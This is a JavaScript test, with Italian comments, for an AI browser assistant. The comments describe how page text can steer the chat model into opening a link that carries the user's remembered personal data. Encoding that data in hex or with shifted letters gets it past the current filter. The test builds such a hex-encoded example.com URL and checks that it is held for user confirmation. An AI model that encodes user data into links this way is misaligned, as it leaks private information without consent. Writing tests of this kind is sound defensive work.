// #553 giro 10 — i dati dell'utente escono lo stesso se il link li traveste.
//
// Il freno riconosce i dati della memoria scritti in chiaro o in base64. Con
// una qualunque altra trasformazione (esadecimale, lettere spostate) non li
// riconosce più, e il secondo controllo — quello che guarda la FORMA del link,
// senza sapere cosa contiene — è acceso solo per l'assistente laterale. Dalla
// chat, che è proprio il posto dove il testo di una pagina appena letta
// suggerisce al modello cosa fare, non è acceso.

import { test, expect } from '../../fixtures/electron.mjs';

const NEWTAB = 'filo://newtab/';
const DATO = 'Mario Rossi Bologna via Garibaldi 12';
const ESADECIMALE = `https://example.com/c?d=${Buffer.from(DATO).toString('hex')}`;
const CHIARO = 'https://example.com/c?d=Mario_Rossi_Bologna';

const esegui = (app, action) => app.evaluate((_e, a) => globalThis.SN_EXECUTE_FILO_ACTION(a), action);

async function seedMemory(app) {
  await app.evaluate(async () => {
    await globalThis.SN_FILO_MEMORY.setMemory({
      PROFILO: 'Si chiama Mario Rossi, vive a Bologna in via Garibaldi 12.',
      PREFERENZE: 'Tema scuro.',
    });
  });
}

async function intercettaRete(app) {
  await app.evaluate(() => {
    globalThis.__rete = [];
    const orig = globalThis.fetch;
    globalThis.__ripristinaRete = () => { globalThis.fetch = orig; };
    globalThis.fetch = async (u) => {
      globalThis.__rete.push(String(u));
      return new Response('<html><body><main><p>ok</p></main></body></html>', {
        status: 200, headers: { 'content-type': 'text/html; charset=utf-8' },
      });
    };
  });
}

const contattati = (app) => app.evaluate(() => globalThis.__rete.slice());

test.afterEach(async ({ app }) => {
  await app.evaluate(() => { try { globalThis.__ripristinaRete?.(); } catch (_) {} });
});

test('anche travestiti, i dati della memoria in un indirizzo aspettano l\'OK dell\'utente', async ({ app, openTab }) => {
  test.setTimeout(60_000);
  await openTab(NEWTAB);
  await seedMemory(app);
  await intercettaRete(app);

  const chiaro = await esegui(app, { type: 'LEGGI_PAGINA', url: CHIARO });
  expect(chiaro.needsConfirm).toBe(2);
  expect(await contattati(app)).toEqual([]);

  // Gli stessi dati, scritti in esadecimale: deve fermarsi come sopra.
  const travestito = await esegui(app, { type: 'LEGGI_PAGINA', url: ESADECIMALE });
  expect(travestito.needsConfirm).toBe(2);
  expect(travestito.executed).toBe(false);
  expect(await contattati(app)).not.toContain(ESADECIMALE);
});
